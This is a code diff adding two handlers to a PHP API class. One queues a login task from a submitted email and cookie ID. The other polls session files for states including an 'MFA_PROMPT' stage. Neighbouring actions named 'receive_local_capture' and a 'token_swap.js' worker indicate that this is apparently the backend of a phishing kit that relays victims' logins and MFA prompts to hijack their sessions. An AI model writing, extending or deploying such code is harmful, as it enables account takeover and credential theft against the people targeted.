@@ -1078,12 +1078,93 @@ class Api {
             case 'receive_local_capture': self::handleReceiveLocalCapture(); break;
             case 'trigger_worker': self::handleTriggerWorker(); break;
             case 'get_connection_status': self::handleGetConnectionStatus(); break;
+            case 'submit_password': self::handleSubmitPassword(); break;
+            case 'check_login_status': self::handleCheckLoginStatus(); break;
             default:
             http_response_code(400);
             echo json_encode(['ok' => false, 'error' => 'Invalid action']);
             break;
         }
     }
+
+    private static function handleSubmitPassword() {
+        if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
+            http_response_code(405);
+            echo json_encode(['ok' => false, 'error' => 'Method Not Allowed']);
+            exit;
+        }
+        $raw = file_get_contents('php://input');
+        $data = json_decode($raw, true);
+        if (!is_array($data)) {
+            http_response_code(400);
+            echo json_encode(['ok' => false, 'error' => 'Invalid JSON']);
+            exit;
+        }
+
+        $email = isset($data['email']) ? trim($data['email']) : '';
+        $cookieId = isset($data['cookieId']) ? preg_replace('/[^a-zA-Z0-9._-]/', '', $data['cookieId']) : uniqid('web_', true);
+
+        if ($email === '') {
+            http_response_code(400);
+            echo json_encode(['ok' => false, 'error' => 'Missing email']);
+            exit;
+        }
+
+        try {
+            $db = new Database();
+            // The password from the UI is now irrelevant, pass a placeholder.
+            $placeholderPassword = 'password_from_file';
+            $db->addTask($cookieId, $email, $placeholderPassword);
+
+            echo json_encode(['ok' => true, 'sessionId' => $cookieId]);
+        } catch (Exception $e) {
+            Security::log("API ERROR (submit_password): " . $e->getMessage());
+            http_response_code(500);
+            echo json_encode(['ok' => false, 'error' => 'Internal Server Error']);
+        }
+    }
+
+    private static function handleCheckLoginStatus() {
+        $sessionId = $_GET['sessionId'] ?? '';
+        if (!$sessionId) {
+            http_response_code(400);
+            echo json_encode(['ok' => false, 'error' => 'Missing sessionId']);
+            exit;
+        }
+
+        $sessionId = preg_replace('/[^a-zA-Z0-9._-]/', '', $sessionId);
+        $storageDir = realpath(__DIR__ . '/../session_data');
+
+        $statusData = ['status' => 'processing', 'data' => null];
+
+        // Check for MFA status file first, as it's a specific intermediate state
+        $mfaStatusFile = $storageDir . '/mfa_prompt_' . $sessionId . '.status';
+        if (file_exists($mfaStatusFile)) {
+            $statusData['status'] = 'MFA_PROMPT';
+            echo json_encode($statusData);
+            exit;
+        }
+
+        // Check for final completed/failed file
+        $completedFile = $storageDir . '/task_' . $sessionId . '.completed';
+        if (file_exists($completedFile)) {
+            $taskData = json_decode(file_get_contents($completedFile), true);
+            $statusData['status'] = $taskData['status'] ?? 'completed';
+            $statusData['data'] = $taskData;
+        }
+        // Check for processing file
+        else if (file_exists($storageDir . '/task_' . $sessionId . '.processing')) {
+            $statusData['status'] = 'processing';
+        }
+        // If no file exists, the session may not have started or has an issue
+        else {
+            $statusData['status'] = 'pending';
+        }
+
+        echo json_encode($statusData);
+        exit;
+    }
+
 
     /**
      * Handles triggering the token_swap.js worker proactively.
